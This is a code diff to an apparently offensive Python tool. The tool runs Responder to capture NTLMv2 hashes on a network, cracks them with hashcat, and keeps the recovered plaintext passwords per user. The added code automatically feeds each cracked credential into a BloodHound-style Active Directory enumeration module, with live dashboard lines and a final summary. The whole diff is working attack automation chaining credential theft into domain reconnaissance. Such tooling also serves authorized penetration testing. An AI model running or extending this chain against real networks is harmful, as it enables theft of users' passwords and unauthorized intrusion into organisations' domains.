@@ -19,6 +19,8 @@ from datetime import datetime
 from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple
 
+import adview_1
+
 
 HOME_CONFIG_PATH = Path.home() / ".netloop_config.json"
 LOCAL_CONFIG_PATH = Path.cwd() / ".netloop_config.json"
@@ -80,6 +82,7 @@ class CrackState:
     completed_jobs: int = 0
     hashcat_errors: int = 0
     cracked_users: Set[str] = field(default_factory=set)
+    cracked_passwords: Dict[str, str] = field(default_factory=dict)
     previously_cracked_seen_this_run: Set[str] = field(default_factory=set)
     jobs: List["CrackJob"] = field(default_factory=list)
     active_job_index: Optional[int] = None
@@ -496,7 +499,9 @@ def _ingest_cracked_stdout_line(line: str, crack_state: CrackState) -> None:
     crack_state.cracked_lines.append(line)
     cracked_user = match.group(1).split("::", 1)[0].strip()
     if cracked_user:
-        crack_state.cracked_users.add(canonical_user(cracked_user))
+        canon = canonical_user(cracked_user)
+        crack_state.cracked_users.add(canon)
+        crack_state.cracked_passwords[canon] = after[1:]
 
 
 def poll_hashcat_state(crack_state: CrackState, verbose: bool = False) -> None:
@@ -586,7 +591,13 @@ def finalize_hashcat_job(
         if "::" in clean_row:
             cracked_user = clean_row.split("::", 1)[0].strip()
             if cracked_user:
-                crack_state.cracked_users.add(canonical_user(cracked_user))
+                canon = canonical_user(cracked_user)
+                crack_state.cracked_users.add(canon)
+                pw_match = NTLMV2_IN_LINE_RE.search(clean_row)
+                if pw_match:
+                    pw_suffix = clean_row[pw_match.end():]
+                    if pw_suffix.startswith(":") and len(pw_suffix) > 1:
+                        crack_state.cracked_passwords[canon] = pw_suffix[1:]
 
     cracked_for_job = canonical_user(user) in crack_state.cracked_users
 
@@ -629,6 +640,7 @@ def render_live_dashboard(
     responder_flags: str,
     started_at: float,
     auto_stop_seconds: int,
+    bh_lines: Optional[List[str]] = None,
 ) -> List[str]:
     elapsed = int(time.time() - started_at)
     timer_text = f"{elapsed}s"
@@ -689,8 +701,7 @@ def render_live_dashboard(
     ]
     if idle_command_line:
         lines.append(idle_command_line)
-    lines.extend(
-        [
+    lines.extend([
         (
             f"Crack queue: {queue_depth} | Completed jobs: {crack_state.completed_jobs} | "
             f"Cracked users: {cracked_user_count}"
@@ -699,10 +710,13 @@ def render_live_dashboard(
         *job_lines,
         "Recent cracked:",
         *recent_lines,
+    ])
+    if bh_lines:
+        lines.extend(bh_lines)
+    lines.extend([
         "",
         c("Ctrl-C: stop responder capture (cracking continues).", Color.CYAN),
-        ]
-    )
+    ])
     return lines
 
 
@@ -751,6 +765,7 @@ def run_capture_and_crack(
     auto_stop_seconds: int,
     persisted_cracked_users: Set[str],
     verbose: bool = False,
+    bh_state: Optional[adview_1.BloodhoundState] = None,
 ) -> Tuple[int, CrackState]:
     responder_path = shutil.which("responder")
     if not responder_path:
@@ -806,8 +821,10 @@ def run_capture_and_crack(
         for path in hash_paths:
             print(c(f"[verbose] monitoring hash file: {path}", Color.CYAN))
 
+    bh_dash = adview_1.render_dashboard_lines(bh_state) if bh_state else []
     dashboard_lines: List[str] = render_live_dashboard(
-        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
+        stats, crack_state, interface, responder_flags, start, auto_stop_seconds,
+        bh_lines=bh_dash,
     )
     dashboard_height = 0 if verbose else draw_live_dashboard(dashboard_lines, previous_line_count=0)
     auto_stop_triggered = False
@@ -860,10 +877,18 @@ def run_capture_and_crack(
                         elif not Path(wordlist).exists():
                             print(c(f"Warning: wordlist not found: {wordlist}. Capture only mode.", Color.YELLOW))
 
+                if bh_state and bh_state.config:
+                    for canon_user, password in crack_state.cracked_passwords.items():
+                        adview_1.queue_run(bh_state, canon_user, password)
+                    adview_1.start_next(bh_state, session_dir, verbose=verbose)
+                    adview_1.poll(bh_state, verbose=verbose)
+
                 now = time.time()
                 if now - last_refresh >= 1.0:
+                    bh_dash = adview_1.render_dashboard_lines(bh_state) if bh_state else []
                     dashboard_lines = render_live_dashboard(
-                        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
+                        stats, crack_state, interface, responder_flags, start, auto_stop_seconds,
+                        bh_lines=bh_dash,
                     )
                     if verbose:
                         print(
@@ -895,7 +920,8 @@ def run_capture_and_crack(
 
                 responder_finished = proc.poll() is not None
                 cracking_finished = crack_state.active_proc is None and not crack_state.pending_users
-                if responder_finished and cracking_finished:
+                bh_done = not bh_state or adview_1.is_idle(bh_state)
+                if responder_finished and cracking_finished and bh_done:
                     break
             except KeyboardInterrupt:
                 if not responder_stop_requested and proc.poll() is None:
@@ -908,10 +934,14 @@ def run_capture_and_crack(
                     proc.send_signal(signal.SIGINT)
                 if crack_state.active_proc and crack_state.active_proc.poll() is None:
                     crack_state.active_proc.send_signal(signal.SIGINT)
+                if bh_state:
+                    adview_1.cleanup(bh_state)
                 break
     except KeyboardInterrupt:
         interrupted = True
         proc.send_signal(signal.SIGINT)
+        if bh_state:
+            adview_1.cleanup(bh_state)
     finally:
         try:
             proc.wait(timeout=15)
@@ -972,13 +1002,12 @@ def resolve_inputs(parsed_args: argparse.Namespace) -> Tuple[str, str, str, str]
             ntlmv2_cfg.get("hashcat_flags", DEFAULT_HASHCAT_FLAGS),
         )
 
-    cfg["ntlmv2"] = {
-        "interface": interface,
-        "responder_flags": responder_flags,
-        "wordlist": wordlist,
-        "hashcat_flags": hashcat_flags,
-        "cracked_users": ntlmv2_cfg.get("cracked_users", []),
-    }
+    ntlmv2_cfg["interface"] = interface
+    ntlmv2_cfg["responder_flags"] = responder_flags
+    ntlmv2_cfg["wordlist"] = wordlist
+    ntlmv2_cfg["hashcat_flags"] = hashcat_flags
+    ntlmv2_cfg.setdefault("cracked_users", [])
+    cfg["ntlmv2"] = ntlmv2_cfg
     save_config(cfg)
     return interface, responder_flags, wordlist, hashcat_flags
 
@@ -1013,6 +1042,7 @@ def configure_parser(subparsers: argparse._SubParsersAction) -> None:
         default=0,
         help="optional timeout to stop responder automatically",
     )
+    adview_1.configure_args(ntlmv2)
 
 
 def run(parsed_args: argparse.Namespace) -> int:
@@ -1022,6 +1052,17 @@ def run(parsed_args: argparse.Namespace) -> int:
         print(c(f"[verbose] active config file: {get_config_path()}", Color.CYAN))
         print(c(f"[verbose] responder flags in use: {responder_flags}", Color.CYAN))
         print(c(f"[verbose] hashcat flags in use: {hashcat_flags}", Color.CYAN))
+
+    bh_state = adview_1.BloodhoundState()
+    if getattr(parsed_args, "bloodhound", False):
+        cfg = load_config()
+        ntlmv2_cfg = cfg.get("ntlmv2", {})
+        bh_config = adview_1.resolve_config(parsed_args, ntlmv2_cfg, prompt_with_default)
+        if bh_config:
+            adview_1.save_to_cfg(bh_config, ntlmv2_cfg)
+            cfg["ntlmv2"] = ntlmv2_cfg
+            save_config(cfg)
+            bh_state.config = bh_config
 
     persisted_cracked_users = load_cracked_users()
     session_stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
@@ -1040,6 +1081,7 @@ def run(parsed_args: argparse.Namespace) -> int:
         parsed_args.auto_stop_seconds,
         persisted_cracked_users,
         verbose=parsed_args.verbose,
+        bh_state=bh_state,
     )
     save_cracked_users(crack_state.cracked_users)
 
@@ -1078,5 +1120,8 @@ def run(parsed_args: argparse.Namespace) -> int:
             print(f"  - {row}")
     else:
         print(c("\nNo cracked hashes yet.", Color.YELLOW))
+
+    for bh_line in adview_1.render_final_summary(bh_state):
+        print(bh_line)
 
     return 0 if crack_rc == 0 else crack_rc
